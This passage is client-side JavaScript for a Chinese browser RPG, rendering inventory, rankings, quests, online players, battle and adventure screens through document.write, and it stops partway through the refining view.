/****************************修改原生功能開始***************************15-1-2026*/
function cd_add(t) {
    if (t == 2 | t == 3 | t == 10) {
        return;
    }
    counts = x + t,
        start_time = new Date,
        start_time = Date.parse(start_time) / 1e3,
        setup_time(start_time),
        window.setTimeout("CountDown()", 100)
}
function job_end(t, e) {
    message_cls();
    var r = parent.wog_view.document
      , i = new Array;
    if (i[0] = "",
    i[1] = "刪除成功",
    i[2] = "轉職成功",
    i[3] = "設定成功",
    i[4] = "感謝你使用本銀行",
    i[5] = "休息了一晚後,HP回復精神飽滿",
    i[6] = "購買完成",
    i[7] = "訊息成功發出",
    i[8] = "成功取得以及裝備奧義",
    i[9] = "開始擺攤",
    i[10] = "建立成功",
    i[11] = "改變成功",
    i[12] = "成功卸除裝備",
    i[13] = "",
    i[14] = "手續完成,請等待核可",
    i[15] = "手續完成",
    i[16] = "過度疲勞寵物死亡",
    i[17] = "寵物逃跑",
    i[18] = "放生成功",
    i[19] = "復活成功",
    i[20] = "任務接受成功",
    i[21] = "恭喜完成任務",
    i[22] = "取消任務成功",
    i[23] = "運氣已更改!",
    i[24] = "官職已設定!",
    i[25] = "聊天室頭銜已更改!",
    i[26] = "安全密碼已更改!",
    i[27] = "出價成功!",
    i[28] = "密碼更改成功,已發送電郵通知!",
    i[29] = "問題已成功回報,請等候回復!",
    i[30] = "訊息發送成功!",
    i[32] = "減去敗數成功!!",
    r.write(temp_table1),
    6 == t ? r.write("<tr><td >" + i[t] + '!!</br><a href="javascript:window.history.back();">點此返回上一頁</a></td></tr>') : r.write("<tr><td >" + i[t] + "!!</td></tr>"),
    e) {
        for (; e.indexOf("&n") > 0; )
            e = e.replace("&n", "<br>");
        r.write("<tr><td class=b1>" + e + "</td></tr>")
    }
    r.write(temp_table2)
}
function rank_view(t) {
    message_cls();
    var e = parent.wog_view.document;
    e.write(""),
    e.write(temp_table1),
    e.write("<tr>"),
    e.write("<td COLSPAn=15><center>幻想戰爭傑出玩家排行榜</center></td>"),
    e.write("</tr><tr>");
    for (var r = 0; r < well.length; r++)
        e.write("<td " + (r != t ? "onmouseover=\"this.style.color='#4B689E'\" onmouseout=\"this.style.color='white'\" onclick=\"parent.wog_view.location.href='wog_etc.php?f=king&type=" + well[r].type + "&time=" + well[r].time + '\'" style="cursor:pointer"' : 'bgcolor="#4B689E"') + ">" + well[r].title + "</td>");
    if (e.write("</tr>" + temp_table2),
    null != t) {
        var i = "";
        if (i = well[t].temp_str) {
            e.write("<center>"),
            e.write('<table width="97%" border="2" cellspacing="2" cellpadding="5" align="center" bordercolor="#868686">');
            for (var o = i.split(";"), d = 0; d < o.length; d++) {
                var n = o[d].split(",");
                e.write(`<tr><td width="25%">No.${n[0]}</td><td width="25%"><a href="javascript:parent.yesname('${n[1]}')">${n[1]}</a></td><td width="50%">${n[2]}</td></tr>`);
            }
            e.write(temp_table2),
            e.write("</center>")
        }
    }
}
function rank_vip_view(t) {
    message_cls();
    var e = parent.wog_view.document;
    e.write(""),
    e.write(temp_table1),
    e.write("<tr>"),
    e.write("<td COLSPAn=15><center>VIP幻想戰爭傑出玩家排行榜</center></td>"),
    e.write("</tr><tr>");
    for (var r = 0; r < well.length; r++)
        e.write("<td " + (r != t ? "onmouseover=\"this.style.color='#4B689E'\" onmouseout=\"this.style.color='white'\" onclick=\"parent.wog_view.location.href='wog_etc.php?f=king_vip&type=" + well[r].type + "&time=" + well[r].time + '\'" style="cursor:pointer"' : 'bgcolor="#4B689E"') + ">" + well[r].title + "</td>");
    if (e.write("</tr>" + temp_table2),
    null != t) {
        var i = "";
        if (i = well[t].temp_str) {
            e.write("<center>"),
            e.write('<table width="97%" border="2" cellspacing="2" cellpadding="5" align="center" bordercolor="#868686">');
            for (var o = i.split(";"), d = 0; d < o.length; d++) {
                var n = o[d].split(",");
                e.write(`<tr><td width="25%">No.${n[0]}</td><td width="25%"><a href="javascript:parent.yesname('${n[1]}')">${n[1]}</a></td><td width="50%">${n[2]}</td></tr>`);
            }
            e.write(temp_table2),
            e.write("</center>")
        }
    }
}
function mission_book(t, e) {
    message_cls(),
    mission_head();
    var r = parent.wog_view.document;
    r.write(`<style>.content{
        height:20px;
        overflow:hidden;
        text-overflow:ellipsis;
        white-space:nowrap;
    }
    input[type='checkbox'] { visibility: hidden; position: absolute; }
    input[type='checkbox']:checked + .content { height: auto; width: auto;}</style>`);
    e = e.split(",");
    for (var i = t.split(";"), o = 0; o < e.length; o++) {
        r.write('<form action="wog_act.php" method="post" target="mission" name=f1 class="missioon_detail">'),
        r.write(temp_table1);
        var d = i[o].split(",");
        r.write('<tr><td bgcolor="000099">' + d[0] + "</td></tr>"),
        r.write("<tr><td>委託者：" + d[1] + "</td></tr>");
        for (var n = d[2]; n.indexOf("&n") > 0; )
            n = n.replace("&n", "<br>");
        r.write("<tr><td class=b1 cellpadding=3><label><input type='checkbox'/><div class='content'><span class='hidden'>" + n + "</span></div></label></td></tr>"),
        r.write("<tr><td>任務所需怪物: " + d[4] + " / " + d[3] + "</td></tr>"),
        r.write("<tr><td><input type=\"button\" value=\"完成任務\" onClick=\"parent.foot_trun('mission','end',''," + e[o] + ",'')\" style=\"" + sbutton + "\"> <input type=\"button\" value=\"放棄任務\" onClick=\"parent.foot_trun('mission','break',''," + e[o] + ",'')\" style=\"" + sbutton + '"></td></tr>'),
        r.write(temp_table2),
        r.write("</form>")
    }
}
function onlinelist(t) {
    online_list = [];
    var e = parent.wog_peo.document;
    message_cls(e, 0),
    e.write(online_temp_table1);
    var r = new Array
      , i = section.placeNum
      , o = 0
      , d = 0
      , n = 0;
    if ("" != t) {
        e.write('<tr bgcolor="#868686"><td>名稱</td><td>LV</td><td>轉生</td></tr>');
        for (var a = t.split(";"), l = 0; l < a.length; l++) {
            var s = a[l].split(",")
              , p = psex(s[1]);
            const clipboardImage = `<div class="tooltip"><img onmouseout="parent.outFunc(this)"  onClick="parent.copyText('${s[0]}',this);" style="margin-right:5px;cursor: pointer;" src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAPFBMVEX///////9HcEz///////////////////////////////////////////////////////////////////+n2Z8OAAAAE3RSTlMY0wCZ7TMrUa4ImKESa4zUh6TlC0yskQAAAFpJREFUGNO9y1sOgDAIRNGRtlCob/a/V7HRxhV4viY3GdBNLCWTPkGzMJ8ecmGZCWq+i3eyuykweeNWw8HNJ9whL6Vb8hPi3sV4w/Bf2L5hA7R+Q1UQr2lYmS7OUwvimmOvhwAAAABJRU5ErkJggg=="/>
  <span class="tooltiptext">Copy to clipboard</span>
</div>`;
            "1" == s[1] ? o++ : d++,
            s[3] = 1 == s[3] ? "Y" : "N",
            r[s[5]] || (r[s[5]] = ""),
            0 == s[10] && (name = ""),
            1 == s[10] && (name = "(GM)"),
            2 == s[10] && (name = "(SGM)"),
            3 == s[10] && (name = "(SA)"),
            s[8] >= 1 ? (r[s[5]] += '<tr><td>' + clipboardImage +'<a href=javascript:parent.yesname("' + s[0] + '") target="foot"><b><font color="#33FF00">' + s[0] + "</font></b></a>" + name + "</td><td>" + s[2] + "</td><td>" + s[6] + "</td></tr>",
            n++) : r[s[5]] += '<tr><td>' + clipboardImage + '<a href=javascript:parent.yesname("' + s[0] + '") target="foot"><b><font color="' + p + '">' + s[0] + "</font></b></a>" + name + "</td><td>" + s[2] + "</td><td>" + s[6] + "</td></tr>"
            online_list.push(s[0]);
        }
        for (l = 0; l < i; l++)
            r[l] && (e.write(r[l]),
            e.write('<tr><td colspan="4">↗' + section.getPlace(l) + "練功↖<hr></td></tr>"));
    } else
        e.write('<tr><td colspan="3"  bgcolor="#868686">線上人數 0 人</td></tr>');
    e.write(temp_table2);
    parent.peoCss();
}
function peoCss() {
    let styles = `
    .tooltip {
      position: relative;
      display: inline-block;
    }

    .tooltip .tooltiptext {
      visibility: hidden;
      width: 140px;
      background-color: #555;
      color: #fff;
      text-align: center;
      border-radius: 6px;
      padding: 5px;
      position: absolute;
      z-index: 1;
      bottom: 150%;
      left: 50%;
      margin-left: -75px;
      opacity: 0;
      transition: opacity 0.3s;
    }

    .tooltip .tooltiptext::after {
      content: "";
      position: absolute;
      top: 100%;
      left: 50%;
      margin-left: -5px;
      border-width: 5px;
      border-style: solid;
      border-color: #555 transparent transparent transparent;
    }

    .tooltip:hover .tooltiptext {
      visibility: visible;
      opacity: 1;
    }
    `;
    let styleSheet = parent.wog_peo.document.createElement("style");
    styleSheet.textContent = styles;
    parent.wog_peo.document.head.appendChild(styleSheet);
}
function copyText(text,target) {
    navigator.clipboard.writeText(text);
    target.parentNode.children[1].innerText = "Copied: " + text;
}
function outFunc(target) {
    setTimeout(()=>{
    target.parentNode.children[1].innerText = "Copy to clipboard";
    },500);
}
function event() {
    parent.foot.document.getElementsByName("ats1")[0].style="background-color:#d30000;"
    parent.foot.document.getElementsByName("ats1")[0].onclick = function(){parent.unlockAd_view()};

    parent.sendNoti();
    var t = parent.wog_view.document;
    message_cls();
    var e = new Date;
    t.write(temp_table1),
        t.write('<form action="wog_act.php" method="post" target="mission"><tr><td>站長要考驗大家是否有認真在玩</td></tr><tr><td>請注意...必須用半形字 及 數目字 1-9 輸入驗證碼 , 每人有5次機會</td></tr><tr><td colspan="2"><img src="wog_etc.php?f=confirm&time=' + e.getTime() + '"></td></tr><tr><td>請輸入安全驗證碼:<input type="text" name="sec_code" size="8"></td></tr>'),
        t.write('<tr><td colspan="2"><input class="text" type="button" value="填好答案了,放我過關吧!!" onClick="parent.foot_trun(\'event\',\'\',this.form.sec_code.value,\'\')" style="' + sbutton + '"></td></tr></form>'),
        t.write(temp_table2);
}
function unlockAd_view(){
    const text = "你確定要解鎖冒險開始嗎？";

    if (confirm(text) == true) {
        parent.ad_view();
        parent.foot.document.getElementsByName("ats1")[0].style="background-color:none;"
        parent.foot.document.getElementsByName("ats1")[0].onclick = function(){parent.ad_view()}
    }
}
function arm_unsetup_all_success() {
    var t, e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
    for (t = 0; t < e.length; ++t) {
        arm_setup(e[t], "");
    }
    let q = parent.wog_view.document;
    message_cls();
    q.write(temp_table1);
    q.write('<tr bgcolor="#4B689E"><td>所有裝備已成功卸下</td></tr>');
    q.write(temp_table2);
}
function arm_view(t, e, r, i, o) {
    const isMobile = uaIsMobile();
    try{
        online_list = online_list;
    }
    catch(e){
        online_list = [];
    }
    const safePW = sessionStorage.getItem("safePW");
    message_cls();
    var d = parent.wog_view.document;
    if (vData = e,
        arm_head(),
        d.write(`<hr><tr><td colspan="11" >可使用的背包格數 ：${i}</td></tr><a id="goEnd" href="javascript:parent.wog_view.document.body.getElementsByClassName('scrollable-table')[0].scrollTo({top: 9999});parent.wog_view.document.body.scrollTo({top: 9999});" style="margin-left:20px;">移到底部</a>`),
        d.write(`<a id="pandora" href="#bottom" style="margin-left:10px;"></a>`),
        d.write(`<a id="hephaestus" href="#bottom" style="margin-left:10px;"></a>`),
        d.write(`<div class='scrollable-table'>`),
        d.write('<form action="wog_act.php" method="post" target="mission" name="f2">'),
        d.write(`<table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686" id="bagList">`),
        d.write(`<thead><tr><th>NO</th><th>裝/轉</th><th>物攻</th><th>魔攻</th><th>物防</th><th>魔防</th><th>速度</th><th id="itemTitle">名稱</th><th>金錢</th><th>霧靈</th><th>印花</th><th>幻點</th><th>販/拍</th><th>物品ID</th></tr></thead>`),
        "0" != e)
        for (var n = t.split(";"), a = 0, l = 0, s = 0; s < n.length; s++) {
            var p = n[s].split(","),
                c = srhCount(p[0]), 
                m = null;
            "" != tmpNum && (m = tmpNum.split(","));
            if(p[5]=='潘朵拉的卡片'|| p[5]=='赫淮斯托斯的卡片'){
                let cardName = p[5][0]+p[5][p[5].length-2];
                p[5] == '潘朵拉的卡片' ? elId = 'pandora' : elId = 'hephaestus'
                parent.wog_view.document.getElementById(elId).outerHTML = `<a id="${elId}" href="javascript:parent.armItemBySumbit(${p[0]})" style="margin-left:10px;">裝備${cardName}(${c}張)</a>`;
                delete elId;
                // console.log(c);
            }
            for (var u = 0; u < c; u++) {
                var w = "",
                    _ = "";
                if (l++,
                    w = "" + att[p[16]],
                    _ = p[16] > 0 ? "<img src='/img/att.jpg' alt='" + w + "' title='" + w + "' width='16'>" : "",
                    null != m)
                    var b = "*" + m[u];
                else
                    b = "";
                var g = "";
                // console.log(c);
                "1" == p[12] && (g = "bgcolor=" + nosend),
                "<acronym title='力量:" + p[8] + " 速度:" + p[9] + " 智力:" + p[10] + " 轉生:" + p[14] + " 職業:" + p[11] + "'>限制</acronym>",
                d.write("<tr " + g + " onMouseOver=\"this.style.backgroundColor='#777779'\" onMouseOut=\"this.style.backgroundColor=''\" onclick=\"parent.setRadioValue('adds'," + p[0] + ");parent.setCheckBoxValue(" + a + ')" style="cursor:hand"><td>' + l + '</td><td><input type="radio" name="adds" value="' + p[0] + '" data-name="' + p[5] + '"></td><td>' + p[6] + "</td><td>" + p[7] + "</td><td>" + p[1] + "</td><td>" + p[2] + "</td><td>" + p[3] + "</td><td><a href=\"javascript:parent.data_send2('arm','check_arm','" + r + "'," + p[0] + "," + l + ')">' + p[5] + "</a>" + b + _ + "</td><td>" + p[4] + "</td><td>" + p[15] + "</td><td>" + p[17] + "</td><td>" + p[18] + '</td><td><input type="checkbox" name="items[]" id="listKey-' + a + '" value="' + p[0] + '"></td><td>'+p[0]+'</td></tr>');
                a++;
                //hide item if that items is over 100 rows
                const maxItemNumber = 100;
                if(u==maxItemNumber-1 && conciseStatus()){
                    d.write(`<tr style="background-color:#777779"><td colspan='14'>已隱藏 ${c-maxItemNumber} 個 ${p[5]}</td></tr>`);
                    break;
                }
            }
        }
    else
        d.write("<tr><td colspan=11>裝備欄內沒有任何裝備</td></tr>");
        n = o.split(",");
        d.write('<tr bgcolor="#777779"><td>---</td><td>---</td><td>' + n[0] + "</td><td>" + n[1] + "</td><td>" + n[2] + "</td><td>" + n[3] + "</td><td>" + n[4] + "</td><td>" + n[10] + "</td><td>" + n[11] + "</td><td>" + n[12] + "</td><td>" + n[13] + "</td><td>" + n[14] + "</td><td>---</td></tr>"),
        d.write('<tr><td colspan="14" ><input type="submit" value="裝備" style="' + sbutton + '"> <input type="button" value="卸下" onclick="parent.foot_trun(\'arm\',\'demount\',\'' + r + '\')" style="' + sbutton + '"> <input type="button" value="轉移" onClick="parent.data_send(\'arm\',\'move\',document.f2.pay_id.value,document.f2.item_num.value,document.f2.adds,document.f2.pw.value)" style="' + sbutton + '"> <input type="button" value="販賣" style="' + sbutton + "\" onClick=if(confirm(\"確定販賣？\")){parent.data_send('arm','sale','" + r + '\',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}> <input type="button" value="擺攤" onClick="parent.sale_item(document.f2.adds,document.f2.pay_id.value)" style="' + sbutton + '"> <input type="button" value="換印花" style="' + sbutton + "\" onClick=if(confirm(\"確定轉換？\")){parent.data_send('arm','stamp','" + r + "',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}><input type=\"button\" value=\"多選物品\" onclick=\"parent.selectMultipleItem()\" style=\"margin-left:4; font-family: 細明體;font-size: 9pt;color: #06fdff;border: 1px solid #EFEFEF;background-color: #000000;\"></td></tr>"),
        "d_item_id" == r ? (d.write('<tr><td colspan="14"><input type="button" value="一鍵使用" onclick="parent.useMultipleItems()" style="margin-right:4; font-family: 細明體;font-size: 9pt;color: #06fdff;border: 1px solid #EFEFEF;background-color: #000000;">請選擇數量:<input type="text" name="item_num" value="1" size="4" maxlength="4"> (最大9999)'),
        d.write("(使用轉移,販賣及換印花記得選擇道具數量)</td></tr>")) : d.write('<input type="hidden" name="item_num" value="1">');
        let playerOptions = "";
        for (let i = 0; i < online_list.length; i++) {
            if(online_list[i]!=parent.p_name){
                playerOptions += `<option value="${online_list[i]}">${online_list[i]}</option>`;
            }
        }
        d.write(`<tr><td colspan="14" ><a href="javascript:parent.wog_view.document.body.getElementsByClassName('scrollable-table')[0].scrollTo({top: 0});" id="bottom" style="margin-right:10px;">回到頂部</a>欲轉移需輸入對方遊戲的帳號`);
        if(isMobile){
            d.write(`
                <input type="text" name="pay_id" id="playList"/>
                <select id="playerList" onchange="this.form.playList.value=this.value">${playerOptions}</select>`
            );
        }else{
            d.write(`
                <input name="pay_id" id="playList" list="playerList"/>
                <datalist id="playerList"><select>${playerOptions}</select></datalist>`
            );
        }
        d.write(`安全密碼 <input ${safePW?"value="+safePW : ""} type="password" name="pw" size="16"></td></tr>`),
        d.write(temp_table2),
        d.write('<input type="hidden" name="f" value="arm">'),
        d.write('<input type="hidden" name="act" value="setup">'),
        d.write("</form>"),
        d.write(`</div>`),
        d.write('<div id="armview" name="armview" style="display:none;background:black;border:1px solid #4B689E;width:160px;height:100px;position:absolute;left:0px;top:0px"></div>'),
        d.write('<div id="wog_message_box"></div>');
        addItemCss();
        if ("d_item_id" != r) {
            parent.wog_view.document.head.getElementsByTagName("style")[1].innerHTML = '.scrollable-table{height:72%;overflow-y:auto;}.scrollable-table>form>#bagList{width:100%}th{background:#083118;position:sticky;top:0;font-size: 11pt;}table#bagList>tbody>tr:nth-last-of-type(-n+2){position: sticky;bottom: 27;background:#000000;}table#bagList>tbody>tr:last-child{position:sticky;bottom:0;background:#000000;}'
        }
        const scrollHeight = parent.wog_view.document.body.getElementsByClassName('scrollable-table')[0].scrollHeight;
        parent.wog_view.document.getElementById("goEnd").setAttribute("href",`javascript:parent.wog_view.document.body.getElementsByClassName('scrollable-table')[0].scrollTo({top: ${scrollHeight}});parent.wog_view.document.body.scrollTo({top: 9999});`)
}
//wog_view背景圖片切換
function message_cls(t, e) {
    var r = parent.wog_view.document;
    null != t && (r = t),
    null == e && (e = 2),
    r.close(),
    r.write("<html>"),
    r.write("<head>"),
    r.write('<meta http-equiv="Content-Type" content="text/html; charset=utf8">'),
    r.write('<meta http-equiv=Cache-Control content="no-cache">'),
    r.write('<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">'),
    r.write("<style type=text/css>"),
    r.write("td {font-family : verdana,Arial,Helvetica ;font-size : 10pt;\ttext-align : center;}"),
    r.write(".b1 {text-align : left;}"),
    r.write("</style>"),
    r.write("</head>"),
    r.write('<link rel="stylesheet" href="./wog.css" type="text/css">');
    if(conciseStatus()){
        r.write('<body oncontextmenu="window.event.returnValue=false" bgcolor="#000000" text="#EFEFEF" link="#EFEFEF" vlink="#EFEFEF" alink="#EFEFEF" >');
    }else{
        r.write('<body oncontextmenu="window.event.returnValue=false" bgcolor="#000000" text="#EFEFEF" link="#EFEFEF" vlink="#EFEFEF" alink="#EFEFEF" style="Background-attachment:fixed; background-image: url(/img/bg.jpg); background-repeat:no-repeat;" >')
    }
}
//開始冒險的圖片切換
function ad_view() {
    var t = parent.wog_view.document;
    let o = 0;
    message_cls();
    if (conciseStatus()) {
        t.write('<center><div style="width:400px;height:100px;">blank</div></center>');
    } else {
        t.write('<center><img src="./img/Fight.png"></center>');
    }
    t.write(temp_table1);
    t.write("<form name=f1>");
    t.write('<tr><td><input type="radio" name="a_type" value="1" checked>冒險修行 <select name="act_area" onChange="parent.select_area(this.options[this.options.selectedIndex].value,this.form)"></select>');
    var i = Gookie("wog_set_cookie");
    if (null != i) {
        o = i.split(",");
    }
    t.write('<select name="act1" onChange="parent.change_mission(0,this.form)"><option value="" SELECTED>選擇場所</option></select><label id="place_id"> 地區id:'+o[1]+'</label></td></tr>');
    t.write('<tr><td><input type="radio" name="a_type" value="2" >武鬥競技 <select name="act2" onChange="parent.change_mission(1,this.form)"><option value="" SELECTED>選擇模式</option><option value="20" >挑戰冠軍</option></select></td></tr>');
    t.write('<tr><td ><input type="radio" name="a_mode" value="1" checked>快速模式  <input type="radio" name="a_mode" value="2" >一般模式</td></tr>');
    t.write('<tr><td >戰鬥回合數 <input type="text" name="f_count" value="400" size="3" maxlength="3"> (最大' + f_count + ")</td></tr>");
    t.write('<tr><td >HP低於 <input type="text" name="f_hp" value="15" size="3" maxlength="2"> %自動使用HP恢復劑</td></tr>');
    t.write('<tr><td ><input type="button" value="物理攻擊" onClick="parent.datechk(1,document.forms[0])" style="' + sbutton + '"> <input type="button" value="魔法攻擊" onClick="parent.datechk(2,document.forms[0])" style="' + sbutton + '"></td></tr>');
    t.write('<tr><td><input type="button" value="攻打領土" onClick="parent.act_click(\'group\',\'fire_list_peo\')" style="' + sbutton + '">--有加入公會才能使用</td></tr>');
    t.write('<tr><td>必殺技名稱 <input type="text" name="sat_name" size="40" maxlength="60" value="' + p_sat_name + '"></td></tr>');
    t.write("</form>");
    t.write(temp_table2);
    for (var e = parent.wog_view.document.f1, r = 0; r < section.area.length; r++) {
        e.act_area.options[r] = new Option(section.area[r].name, r);
    }
    if (null != i) {
        if (0 == o[0]) {
            t.write('<script>document.forms[0].a_type[0].checked=true;document.forms[0].a_type[1].checked=false;parent.select_area("' + o[3] + '",document.forms[0]);document.forms[0].act_area.value=' + o[3] + ";document.forms[0].act1.value=" + o[1] + ";</script>");
        } else {
            t.write("<script>document.forms[0].a_type[1].checked=true;document.forms[0].a_type[0].checked=false;document.forms[0].act2.value=" + o[1] + ";</script>");
        }
        t.write("<script>document.forms[0].a_mode[0].checked=true;document.forms[0].a_mode[1].checked=false;</script>");
    }
    i = Gookie("wog_set_f_count");
    if (null != i) {
        t.write("<script>document.f1.f_count.value=" + i + ";</script>");
    }
    i = Gookie("wog_set_f_hp");
    if (null != i) {
        t.write("<script>document.f1.f_hp.value=" + i + ";</script>");
    }
}
function datechk(t, e) {
    var r = parent.foot.document.f1
      , o = "";
    !0 == r.ats1.disabled && (o = "5秒內不能冒險"),
    e.f_count.value > 400 && (o = "戰鬥回合數不能大於" + f_count),
    !0 == e.a_type[0].checked && (r.act.value = e.act1.value,
    r.temp_id.value = 0),
    !0 == e.a_type[1].checked && (r.act.value = e.act2.value,
    r.temp_id.value = 1,
    "20" != e.act2.value || confirm("挑戰冠軍需付50000元費用") || (o = "結束挑戰"),
    "21" == e.act2.value && "" == r.towho.value && (o = "沒有選擇對像不能PK")),
    "" == r.act.value && (o = "請選擇場地"),
    "" != o ? alert(o) : (!0 == e.a_mode[0].checked && (r.temp_id2.value = 1),
    !0 == e.a_mode[1].checked && (r.temp_id2.value = 2),
    Sookie("wog_set_cookie", r.temp_id.value + "," + r.act.value + "," + r.temp_id2.value + "," + e.act_area.value),
    Sookie("wog_set_f_count", e.f_count.value),
    Sookie("wog_set_f_hp", e.f_hp.value),
    r.f.value = "fire",
    r.action = "wog_fight.php",
    r.at_type.value = t,
    r.sat_name.value = e.sat_name.value,
    r.temp_id3.value = e.f_count.value,
    r.temp_id4.value = e.f_hp.value,
    r.submit());
    checkForNewCaptcha(3).then((result) => {
        console.log(result);
        if(result){
            parent.foot.document.getElementsByName("ats1")[0].style="background-color:#d30000;"
            parent.foot.document.getElementsByName("ats1")[0].onclick = function(){parent.unlockAd_view()};
            parent.sendNoti();
        }
    });
}
function change_mission(t, e) {
    var r = e;
    0 == t ? r.a_type[0].checked = !0 : 1 == t && (r.a_type[1].checked = !0);
    parent.wog_view.document.querySelector("#place_id").innerText = " 地區id:" + parent.wog_view.f1[2].value; //修改地區id
}
//刪除戰鬥的圖片
function fire_date(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, _, b, g, h) {
    var v = parent.wog_view.document
      , f = get_name()
      , y = 0
      , k = new Image;
    level2 = parent.foot.document.getElementById("lv").innerHTML;
    temp_p_hp = o,
    temp_p_hpmax = d,
    temp_m_hp = u,
    temp_m_hpmax = w;
    var E = temp_p_hp / temp_p_hpmax * 100
      , x = (temp_m_hp,
    temp_m_hpmax,
    "");
    setup_mname(b),
    message_cls(),
    n = s_status(n),
    _ = s_status(_),
    "" == g && (g = "no_img.jpg"),
    k.src = x,
    y = 200 - Math.floor(parseInt(k.height) / 4),
    v.write(fight_temp_table1 + '<tr><td colspan="4">' + f + " (" + n + '屬性)</td><td width="100" rowspan="7">第 <font color="red" size="4"><span id="count">0</span></font> 回合</td><td colspan="4" >' + b + " (" + _ + "屬性)</td></tr>"),
    v.write('<tr><td width="12.5%">HP</td><td class=b1 width="37.5%" colspan="3"></td><td width="12.5%">HP</td><td class=b1 width="37.5%" colspan="3"></td></tr>'),
    v.write('<tr><td>物攻</td><td width="12.5%">' + t + '</td><td width="12.5%">物防</td><td width="12.5%">' + e + '</td><td width="12.5%">物攻</td><td width="12.5%">' + s + '</td><td width="12.5%">物防</td><td width="12.5%">' + p + "</td></tr>"),
    v.write('<tr><td width="12.5%">魔攻</td><td width="12.5%">' + r + '</td><td>魔防</td><td width="12.5%">' + i + '</td><td width="12.5%">魔攻</td><td width="12.5%">' + c + '</td><td>魔防</td><td width="12.5%">' + m + "</td></tr>"),
    v.write(temp_table2),
    v.write('<table width="600" border="0" cellspacing="0" cellpadding="0" align="center" >'),
    v.write('<tr><td width="50%" height="185" align="center"></td><td align="center" width="50%" height="150">' + g + "</td></tr>"),
    v.write(temp_table2),
    v.write('<br><table width="97%" border="0" cellspacing="0" cellpadding="0" align="center" ><tr><td colspan="2" align="center">' + hr + '<div align="center" id="a1"></td></tr>'),
    v.write(temp_table2),
    "" != p_support_name && v.write('<img id=g4 src="' + img + p_support_img + '.gif" border="0" style="position: absolute;left: 5%;top: 200;Z-INDEX: 1;visibility: hidden">')
}
async function pet_break() {
    var t = parent.wog_view.document;
    setTimeout(async()=>{
        if(confirm('捕捉器損壞, 要換上新的捕捉器嗎?')){
            await parent.armItem(258);
        }
    },500);
}
async function pet_get(t) {
    var e = parent.wog_view.document;
    e.write(temp_table1),
    e.write("<tr><td>捕捉到 " + t + "</td></tr>"),
    e.write(temp_table2)
    setTimeout(async()=>{
        if(confirm('捕捉到' + t + ', 要換上新的捕捉器嗎?')){
            await parent.armItem(258);
        }
    },500);
}
function lv_up(t, e, r, i, o, d, n, a) {//顯示上升等級
    var l = parent.wog_view.document;
    null == a && (l.write(hr),
    l.write(temp_table1),
    l.write('<tr><td colspan="10"><b>' + p_name + " 等級上升 "+((parseInt(parent.foot.document.getElementById("lv").innerHTML))-(level2))+"</b></td></tr>"),
    l.write("<tr><td><b>力量</b></td>"),
    l.write("<td><b>速度</b></td>"),
    l.write("<td><b>智力</b></td>"),
    l.write("<td><b>生命</b></td>"),
    l.write("<td><b>體質</b></td>"),
    l.write("<td><b>魅力</b></td>"),
    l.write("<td><b>信仰</b></td></tr>"),
    l.write("<tr><td><b>↑ " + t + "</b></td>"),
    l.write("<td><b>↑ " + e + "</b></td>"),
    l.write("<td><b>↑ " + r + "</b></td>"),
    l.write("<td><b>↑ " + i + "</b></td>"),
    l.write("<td><b>↑ " + o + "</b></td>"),
    l.write("<td><b>↑ " + d + "</b></td>"),
    l.write("<td><b>↑ " + n + "</b></td></tr>"),
    l.write(temp_table2))
}
//刪除gif及統計人數
function onlinelist2(t) {
    online_list = [];
    var e = parent.wog_peo.document;
    message_cls(e, 0),
    e.write(online_temp_table1);
    var r = new Array
      , i = section.placeNum
      , o = 0
      , d = 0
      , n = 0;
    if ("" != t) {
        e.write('<tr bgcolor="#868686"><td>名稱</td><td>LV</td><td>轉生</td></tr>');
        for (var a = t.split(";"), l = 0; l < a.length; l++) {
            var s = a[l].split(",")
              , p = psex(s[1]);
            "1" == s[1] ? o++ : d++,
            s[3] = 1 == s[3] ? "Y" : "N",
            r[s[5]] || (r[s[5]] = ""),
            0 == s[10] && (name = ""),
            1 == s[10] && (name = "(GM)"),
            2 == s[10] && (name = "(SGM)"),
            3 == s[10] && (name = "(SA)"),
            s[8] >= 1 ? (r[s[5]] += '<tr><td><a href=javascript:parent.yesname("' + s[0] + '") target="foot"><b><font color="#33FF00">' + s[0] + "</font></b></a>" + name + "</td><td>" + s[2] + "</td><td>" + s[6] + "</td></tr>",
            n++) : r[s[5]] += '<tr><td><a href=javascript:parent.yesname("' + s[0] + '") target="foot"><b><font color="' + p + '">' + s[0] + "</font></b></a>" + name + "</td><td>" + s[2] + "</td><td>" + s[6] + "</td></tr>",
            online_list.push(s[0]);
        }
        for (l = 0; l < i; l++)
            r[l] && (e.write(r[l]),
            e.write('<tr><td colspan="4">↗' + section.getPlace(l) + "練功↖<hr></td></tr>"));
    } else
        e.write('<tr><td colspan="3"  bgcolor="#868686">線上人數 0 人</td></tr>');
    e.write(temp_table2)   
}
function syn_view(t, e, r) { //精煉新增勾選5龍石
    var i = parent.wog_view.document;
    message_cls();
    vData = e;
    const parts = ['a_id','d_head_id','d_body_id','d_hand_id','d_foot_id','d_item_id','d_card_id','d_car_id','d_ca_id','d_book_id','d_god_id'];
    i.write(temp_table1);
    i.write('<form action="wog_act.php" method="post" name=f1 target="mission">');
    i.write('<tr><td><img src="./img/eq/weapon.jpg"><br>武器</td><td><img src="./img/eq/head.jpg"><br>頭部</td><td><img src="./img/eq/body.jpg"><br>身體</td><td><img src="./img/eq/hand.jpg"><br>手部</td><td><img src="./img/eq/foot.jpg"><br>腳部</td><td><img src="./img/eq/tool.jpg"><br>道具</td><td><img src="./img/eq/simp.jpg"><br>護符</td><td><img src="./img/eq/ride.jpg"><br>座騎</td><td><img src="./img/eq/card.jpg"><br>幻想卡</td><td><img src="./img/eq/book.jpg"><br>幻戰書</td><td><img src="./img/eq/graund.jpg"><br>守護者</td></tr><tr>');
    for(let j=0;j<parts.length;j++){
        i.write(`<td onmouseover=\"this.style.color='white';this.style.backgroundColor='#4B689E'\" onmouseout=\"this.style.color='white';this.style.backgroundColor=''\" onClick=\"parent.act_click('arm','view','${parts[j]}')\">裝備</td>`);
    }
    i.write("</tr>");
    i.write("<tr>");
